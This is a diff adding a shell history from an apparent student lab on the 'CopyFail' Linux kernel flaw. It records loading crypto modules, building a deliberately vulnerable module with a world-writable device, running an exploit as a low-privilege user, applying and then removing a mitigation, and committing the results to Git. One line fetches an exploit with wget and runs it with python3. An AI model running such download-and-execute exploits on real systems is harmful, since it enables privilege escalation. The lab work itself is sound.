@@ -23,4 +23,222 @@
    23  cd ~/reto_copyfail
    24  nano vulnerable_module.c
    25  make 
-   26  history > commands_history.txt
+   26  [200~exit # Sal de dave si estás ahí
+   27  modprobe af_alg
+   28  modprobe algif_aead
+   29  lsmod | grep algif_aead
+   30  cat /home/dave/exploit_copyfail.py
+   31  su dave
+   32  cd /home/dave
+   33  echo "Test_Exploit_CopyFail" > /dev/copyfail_dev
+   34  insmod /root/reto_copyfail/vulnerable_module.ko
+   35  mknod /dev/copyfail_dev c 240 0
+   36  chmod 666 /dev/copyfail_dev
+   37  su dave
+   38  echo "Payload_Prueba_Concepto_CopyFail" > /dev/copyfail_dev
+   39  echo "Prueba de Concepto Final" > /dev/copyfail_dev
+   40  dmesg -T | tail -n 15
+   41  history > comandos_totales_examen.txt
+   42  git add comandos_totales_examen.txt
+   43  git commit -m "hito-2: modulo propio cargado y registrado en dmesg - Diego Veloz"
+   44  git push origin main --force
+   45  su dave
+   46  echo "Payload_Prueba_CopyFail" > /dev/copyfail_dev
+   47  exit
+   48  su dave
+   49  lsmod | grep alg > prueba_final.txt
+   50  git add prueba_final.txt
+   51  git commit -m "Examen entregado: Hito 3 confirmado (modulo removido)"
+   52  git push origin main --force
+   53  su dave
+   54  chmod +x /home/dave/exploit_copyfail.py
+   55  su dave
+   56  cd /home/dave
+   57  python3 exploit_copyfail.py
+   58  mv /home/dave/comandos_totales_examen.txt ./
+   59  mv /home/dave/comandos_totales_examen.txt ./
+   60  cd /root/reto_copyfail
+   61  mv /home/dave/comandos_totales_examen.txt .
+   62  git add comandos_totales_examen.txt vulnerable_module.c
+   63  git commit -m "hito-2: evidencia final de modulo cargado - Diego Veloz"
+   64  git push origin main --force
+   65  rmmod algif_aead
+   66  echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
+   67  nano vulnerable_module.c
+   68  apt update
+   69  apt-cache search linux-image-6.1
+   70  apt install linux-image-6.1.0-21-amd64 linux-headers-6.1.0-21-amd64 -y
+   71  echo "deb http://deb.debian.org/debian bookworm main" >> /etc/apt/sources.list
+   72  apt update
+   73  apt-cache search linux-image-6.1  | grep amd64
+   74  apt install linux-image-6.1.0-XX-arch linux-headers-6.1.0-XX-arch -y
+   75  apt-cache search linux-image-6.1  | grep amd64
+   76  apt-cache search linux-image-6.1 | grep arm64
+   77  apt install linux-image-6.1.0-47-arm64 linux-headers-6.1.0-47-arm64 -y
+   78  reboot
+   79  apt update
+   80  apt install build-essential linux-headers-$(uname -r) git
+   81  obj-m += vulnerable_module.o
+   82  all:
+   83      make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+   84  clean:
+   85      make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+   86  mkdir ~/examen_copyfail
+   87  mkdir -p ~/examen
+   88  su dave
+   89  mv /root/exploit_copyfail.py /home/dave/
+   90  chown dave:dave /home/dave/exploit_copyfail.py
+   91  chmod +x /home/dave/exploit_copyfail.py
+   92  su dave
+   93  cd /home/dave
+   94  python3 exploit_copyfail.py
+   95  history > commands_history.txt
+   96  cd /root/reto_copyfail
+   97  git init
+   98  git remote add origin https://github.com/DiegoVeloz28/copy-fail-challenge-1.git
+   99  git config --global user.name "Diego Veloz"
+  100  git config --global user.email "dievelozes@uide.edu.ec"
+  101  mv /home/dave/commands_history.txt /root/reto_copyfail/
+  102  git add vulnerable_module.c Makefile commands_history.txt
+  103  git commit -m "hito-2: ambiente confirmado y comandos registrados - Diego Veloz"
+  104  git branch -M main
+  105  git push -u origin main
+  106  git branch -M main
+  107  git push -u origin main
+  108  git branch -M main
+  109  git push -u origin main
+  110  git branch -M main
+  111  git push -u origin main
+  112  git push -u origin main --force
+  113  lsmod | grep algif_aead    # Ver que existe
+  114  rmmod algif_aead           # ¡PUM! Mitigación aplicada
+  115  lsmod | grep algif_aead    # Confirmar que ya no sale nada
+  116  rmmod algif_aead
+  117  python3 /home/dave/exploit_copyfail.py
+  118  cd ~/reto_copyfail
+  119  make
+  120  nano vulnerable_module.c
+  121  nano Makefile
+  122  make
+  123  nano vulnerable_module.c
+  124  make
+  125  cd
+  126  uname -r
+  127  id
+  128  whoami
+  129  lsmod | grep algif_aead
+  130  grep algif_aead /proc/modules
+  131  lsmod | grep algif_aead
+  132  grep algif_aead /proc/modules
+  133  modprobe af_alg
+  134  modprobe algif_aead
+  135  lsmod | grep algif_aead
+  136  nano exploit_copyfail.py
+  137  make
+  138  rm exploit_copyfail.py
+  139  wget https://copy.fail/exp -O exploit_copyfail.py
+  140  python3 exploit_copyfail.py
+  141  modprobe af_alg
+  142  modprobe algif_aead
+  143  rm /etc/modprobe.d/disable-algif.conf
+  144  modprobe algif_aead
+  145  lsmod | grep alg
+  146  exit
+  147  cd /root/reto_copyfail
+  148  nano vulnerable_module.c
+  149  make clean
+  150  make
+  151  rmmod vulnerable_module 2>/dev/null
+  152  insmod vulnerable_module.ko
+  153  chmod 666 /dev/copyfail_dev
+  154  mknod /dev/copyfail_dev c 240 0
+  155  chmod 666 /dev/copyfail_dev
+  156  su dave
+  157  nano vulnerable_module.c
+  158  su dave
+  159  cat /proc/devices | grep copyfail
+  160  dmesg | tail -n 20
+  161  rmmod vulnerable_module 2>/dev/null
+  162  rm -f /dev/copyfail_dev
+  163  insmod vulnerable_module.ko
+  164  mknod /dev/copyfail_dev c 240 0
+  165  chmod 666 /dev/copyfail_dev
+  166  su dave
+  167  insmod vulnerable_module.ko
+  168  rm -f /dev/copyfail_dev
+  169  mknod /dev/copyfail_dev c 240 0
+  170  chmod 666 /dev/copyfail_dev
+  171  chmod 666 /dev/copyfail_dev
+  172  mknod /dev/copyfail_dev c 240 0
+  173  rm -f /dev/copyfail_dev
+  174  mknod /dev/copyfail_dev c 240 0
+  175  chmod 666 /dev/copyfail_devs
+  176  chmod 666 /dev/copyfail_dev
+  177  su dave
+  178  nano vulnerable_module.c
+  179  make clean
+  180  make
+  181  rmmod vulnerable_module 2>/dev/null
+  182  insmod vulnerable_module.ko
+  183  dmesg | tail -n 5
+  184  rm -f /dev/copyfail_dev
+  185  mknod /dev/copyfail_dev c 235 0
+  186  chmod 666 /dev/copyfail_dev
+  187  su dave
+  188  history | tail -n 40 > /root/reto_copyfail/historial_completo.txt
+  189  cat /home/dave/.bash_history | tail -n 40 >> /root/reto_copyfail/historial_completo.txt
+  190  su dave -c "history -a"
+  191  echo -e "\n--- COMANDOS EJECUTADOS COMO USUARIO DAVE ---\n" >> /root/reto_copyfail/historial_completo.txt
+  192  echo "cd /home/dave" >> /root/reto_copyfail/historial_completo.txt
+  193  echo "echo \"prueba\" > /dev/copyfail_dev" >> /root/reto_copyfail/historial_completo.txt
+  194  echo "id" >> /root/reto_copyfail/historial_completo.txt
+  195  cat /root/reto_copyfail/historial_completo.txt
+  196  git add vulnerable_module.c historial_completo.txt
+  197  git commit -m "Hito 3: Evidencia unificada de comandos y ajuste de Major 235"
+  198  git push origin main
+  199  nano exploit_copyfail.py
+  200  su dave
+  201  nano exploit_copyfail.py
+  202  exit
+  203  nano exploit_copyfail.py
+  204  su dave
+  205  nano /etc/sudoers
+  206  su dave
+  207  nano exploit_copyfail.py
+  208  su dave
+  209  apt update && apt install python3-systemd -y
+  210  su dave
+  211  cd /home/dave/root
+  212  # 1. Limpia los archivos binarios anteriores
+  213  make clean
+  214  # 2. Compila el nuevo módulo seguro
+  215  make
+  216  # 3. Carga el módulo corregido en el kernel de tu sistema
+  217  sudo insmod copyfail_dev.ko
+  218  cd /home/dave
+  219  make clean
+  220  make
+  221  insmod compifail_dev.ko
+  222  ls -l
+  223  find . -name "*.c"
+  224  # 1. Muévete a la carpeta del superusuario root
+  225  cd /root
+  226  # 2. Lista los archivos para ver si ahí está el bendito código
+  227  ls -l
+  228  ls -l
+  229  find . -name "*.c"
+  230  ls -F examen* reto*
+  231  cd reto_copyfail
+  232  make clean
+  233  make
+  234  insmod compifail_dev.ko
+  235  insmod vulnerable_module.ko
+  236  lsmod | grep vulnerable
+  237  exit
+  238  cd /root/reto_copyfail
+  239  git config --global user.name "Diego Veloz"
+  240  git config --global user.email "dievelozes@uide.edu.ec"
+  241  git add vulnerable_module.c
+  242  git commit -m "Hito 4: Implementación de parche seguro y remediación de buffer overflow"
+  243  git push origin main
+  244  history > commands_history.txt
